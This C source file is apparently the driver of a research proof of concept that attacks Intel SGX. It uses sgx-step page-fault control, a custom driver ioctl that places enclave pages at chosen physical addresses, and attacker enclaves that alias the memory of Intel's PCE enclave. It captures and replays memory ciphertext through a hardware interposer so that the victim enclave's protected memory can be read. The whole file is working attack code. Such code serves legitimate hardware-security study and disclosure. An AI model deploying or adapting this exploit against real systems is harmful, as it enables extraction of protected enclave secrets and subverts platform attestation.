#include <sgx_urts.h>
#include <sgx_report.h>
#include <signal.h>
#include <sys/reg.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>

#include "libsgxstep/apic.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/sched.h"
#include "libsgxstep/enclave.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/file.h"
#include "Enclave/encl_u.h"
#include "attacker-enclave-alias/Enclave/aae_encl_u.h"
#include "attacker-enclave-read/Enclave/are_encl_u.h"

#include "readalias.h"
#include "mem_range_repo.h"
#include "helpers.h"

/* downloaded from https://download.01.org/intel-sgx/sgx-linux/2.24/prebuilt_ae_2.24.tar.gz */
#define PCE_PATH "libsgx_pce.signed.so"

/* manually define the type as including the
 * 'external/dcap_source/QuoteGeneration/ae/inc/internal/pce_cert.h'
 * header leads to multiple-define errors for CUR_PCE_ID at linking...
 */
typedef struct _psvn_t{
    sgx_cpu_svn_t    cpu_svn;
    sgx_isv_svn_t    isv_svn; /*PvE/QE SVN*/
}psvn_t;
sgx_status_t certify_enclave(sgx_enclave_id_t eid, uint32_t* retval, const psvn_t* cert_psvn, const sgx_report_t* report, uint8_t* signature, uint32_t signature_buf_size, uint32_t* signature_out_size);

void *target_ptr = NULL, *target_page = NULL, *stack_addr = NULL;
int fault_fired = 0;
uint64_t stack_pa = 0, stack_alias = 0;

#define SGX_MAGIC 0xA4

#define SGX_IOC_EPC_PAGE_ADDR \
        _IOW(SGX_MAGIC, 0x00, struct sgx_epc_page_addr)

struct sgx_epc_page_addr  {
        unsigned long   pa;
        int alloc_nb;
        int nb_pages;
} __attribute__((__packed__));

sgx_enclave_id_t aae_eid = 0, are_eid = 0;


void fault_handler(int signo, siginfo_t *si, void *ctx) {
    address_mapping_t *si_map;
    uint64_t si_pa;
    ASSERT(fault_fired < 5);

    switch (signo) {
        case SIGSEGV:
            
            si_map = get_mappings(si->si_addr);
            si_pa = phys_address(si_map, PAGE);
            info("Caught page fault (base address=%p -- pa=%#lx)", si->si_addr, si_pa);
            break;

        default:
            info("Caught unknown signal '%d'", signo);
            abort();
    }

    if (si->si_addr == target_page) {
        wbinvd_ac();
  
        SGX_ASSERT( aae_capture_buffer(aae_eid) );
        SGX_ASSERT( aae_replay_buffer(aae_eid) );
        SGX_ASSERT( aae_flush_buffer(aae_eid) );
        
        printf("Enable interposer and press enter to capture ciphertext\n"); getchar();

        SGX_ASSERT( aae_capture_buffer(aae_eid) );

        printf("Ciphertext successfully captured. Disable interposer to continue\n"); getchar();

        info("Restoring access rights..");
        ASSERT(!mprotect(target_page, 4096, PROT_READ | PROT_EXEC));
        print_pte_adrs(target_ptr);
    } else {
        info("Unknown #PF address!");
    }

    fault_fired++;
}

#define ECC_SIG_SIZE 64 // (sizeof(sgx_ec256_signature_t))

void custom_hexdump(char* data, size_t size) {
    file_write("./pce-dump.bin", (uint8_t*)data, size);
}

/* Untrusted main function to create/enter the trusted enclave. */
int main( int argc, char **argv )
{
    sgx_enclave_id_t pce_eid;
    int updated = 0;
    int sgx_fd;
    struct sgx_epc_page_addr args;
    sgx_report_t report = {0};
    sgx_status_t pce_rv;
    uint8_t sig[ECC_SIG_SIZE] = {0};
    uint32_t pce_sig_out_sz;
    psvn_t pce_psvn = {
        .cpu_svn = 0,
        .isv_svn = 0
    };

    struct sigaction act, old_act;

    if(argc != 2 ) {
        printf("Usage: ./app <path to alias definition csv>\n");
        return -1;
    }

    open_kmod();

    // Open the SGX driver
    sgx_fd = open("/dev/isgx", O_RDWR);
    if (sgx_fd < 0) {
        perror("Failed to open /dev/isgx\n");
        return -1;
    }

    char* path_alias_csv = argv[1];
    mem_range_t* mrs = NULL;
    uint64_t* alias_masks = NULL;
    size_t mrs_len;
    if( parse_csv(path_alias_csv, &mrs, &alias_masks, &mrs_len) ) {
        err_log("failed to parse memory range and aliases from %s\n", path_alias_csv);
        return -1;
    }

    args.pa = 0x7093b82000;     // The base address from which we will allocate
    args.alloc_nb = 461; // 444 is 29 before the end
    args.nb_pages = 8;      

    // Set these address properties before creating the enclave
    ioctl(sgx_fd, SGX_IOC_EPC_PAGE_ADDR, &args);

    info_event("Creating victim PCE enclave at '" PCE_PATH "'");
    SGX_ASSERT( sgx_create_enclave( PCE_PATH, /*dbg=*/0, NULL,
                                    &updated, &pce_eid, NULL ));
    print_enclave_info();


    info("Starting dry-run");

    file_read("./pce-report.bin", (uint8_t*)&report, sizeof(report));


    // Dry run to map the pages
    SGX_ASSERT( certify_enclave(pce_eid, &pce_rv,
                    /*in_cert_psvn=*/&pce_psvn,
                    /*in_report=*/&report,
                    /*out_sig=*/sig,
                    /*in_sig_buf_size=*/ECC_SIG_SIZE,
                    /*out_sig_out_size=*/&pce_sig_out_sz) );
    info("returned from pce with rv=%d\n", pce_rv);
    printf("signature (size=%d): ", pce_sig_out_sz);
    dump_hex(sig, pce_sig_out_sz);

    stack_addr = get_enclave_base();
    address_mapping_t *map = get_mappings(stack_addr);
    stack_pa = args.pa;

    printf("Stack PA=%#lx\n", stack_pa);
   

    // Get the alias for the pa of the buffer
    uint64_t alias;
    if (get_alias(stack_pa, mrs, alias_masks, 1, &stack_alias)) {
        err_log("Error: Unable to compute alias address.\n");
        return -1;
    }



    // Copied from sgx-step/app/aep-redirect
    info("Revoking code page access rights...");
    target_ptr = get_enclave_base() + 0x14bd0; // sgx_ipp_newBN
    target_page = (void*)((uintptr_t)target_ptr & ~PFN_MASK);
    info("Target page at address %p with PTE:", target_ptr);
    print_pte_adrs(target_ptr);
    ASSERT(!mprotect(target_page, 4096, PROT_NONE));
    print_pte_adrs(target_ptr);

    // Specify #PF handler with signinfo arguments
    memset(&act, 0, sizeof(sigaction));
    act.sa_sigaction = fault_handler;
    act.sa_flags = SA_RESTART | SA_SIGINFO;

    // Block all signals while the signal is being handled
    sigfillset(&act.sa_mask);
    ASSERT(!sigaction(SIGSEGV, &act, &old_act));

    // Creating the alias enclave
    info_event("Creating attack alias enclave");

    // Set up the attacker enclave to alias with the pce
    args.pa = (unsigned long)stack_alias;
    args.alloc_nb = 71;     // Here, we do have to make sure to set the correct offset
    args.nb_pages = 8;      // Size of the buffer of the aae

    

    // Call the first IOCTL command
    ioctl(sgx_fd, SGX_IOC_EPC_PAGE_ADDR, &args);

    

    info_event("Creating attacker enclave...");
    SGX_ASSERT( sgx_create_enclave( "./attacker-enclave-alias/Enclave/aae_encl.so", /*debug=*/0,
                                    NULL, NULL, &aae_eid, NULL ) );

    // Get the va of the buffer and translate it to its pa
    unsigned char *buffer;
    SGX_ASSERT( aae_initialize_buffer(aae_eid) );
    SGX_ASSERT( aae_get_buffer_addr(aae_eid, (void*)&buffer) );

    map = get_mappings(buffer);
    uint64_t pa = phys_address(map, PAGE);
   
    printf("\nBuffer allocated at va=0x%lx -- pa=0x%lx\n", buffer, pa);


    info_event("calling victim PCE enclave...");
    SGX_ASSERT( certify_enclave(pce_eid, &pce_rv,
                    /*in_cert_psvn=*/&pce_psvn,
                    /*in_report=*/&report,
                    /*out_sig=*/sig,
                    /*in_sig_buf_size=*/ECC_SIG_SIZE,
                    /*out_sig_out_size=*/&pce_sig_out_sz) );
    info("returned from pce with rv=%d\n", pce_rv);
    printf("signature (size=%d): ", pce_sig_out_sz);
    dump_hex(sig, pce_sig_out_sz);

    file_write("./pce-signature.bin", (uint8_t*)&sig, pce_sig_out_sz);

    SGX_ASSERT( sgx_destroy_enclave( pce_eid ) );

    info_event("Creating attack read enclave...");

    args.pa = stack_pa;
    args.alloc_nb = 42;
    args.nb_pages = 29;
  
    ioctl(sgx_fd, SGX_IOC_EPC_PAGE_ADDR, &args);

    info_event("Creating attacker enclave...");
    SGX_ASSERT( sgx_create_enclave( "./attacker-enclave-read/Enclave/are_encl.so", /*debug=*/1,
                                    NULL, NULL, &are_eid, NULL ) );

    // Get the va of the buffer and translate it to its pa
    SGX_ASSERT( are_initialize_buffer(are_eid) );
    SGX_ASSERT( are_get_buffer_addr(are_eid, (void*)&buffer) );

    map = get_mappings(buffer);
    pa = phys_address(map, PAGE);
   
    printf("\nBuffer allocated at va=0x%lx -- pa=0x%lx\n", buffer, pa);

    SGX_ASSERT( are_write_to_buffer(are_eid, 0x00) );
    SGX_ASSERT( are_flush_buffer(are_eid) );
    SGX_ASSERT( aae_replay_buffer(aae_eid) );

    printf("Buffer is initialized to all zero\n");

    printf("Enable interposer and press enter to replay ciphertext\n"); getchar();

    SGX_ASSERT( aae_replay_buffer(aae_eid) );

    printf("Successfully replayed ciphertext. Disable interposer to continue\n"); getchar();

    SGX_ASSERT( are_print_buffer(are_eid) );

    SGX_ASSERT( sgx_destroy_enclave( aae_eid ) );
    SGX_ASSERT( sgx_destroy_enclave( are_eid ) );

    info_event("Done.");

    return 0;
}
